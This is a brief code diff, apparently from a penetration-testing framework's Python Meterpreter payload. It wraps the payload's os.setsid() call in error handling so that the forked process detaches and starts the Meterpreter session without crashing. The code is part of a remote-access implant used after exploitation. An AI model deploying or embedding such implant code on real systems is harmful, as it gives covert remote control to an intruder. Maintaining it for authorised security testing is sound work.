@@ -510,6 +510,9 @@ class PythonMeterpreter(object):
 
 if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 	if hasattr(os, 'setsid'):
-		os.setsid()
+		try:
+			os.setsid()
+		except OSError:
+			pass
 	met = PythonMeterpreter(s)
 	met.run()
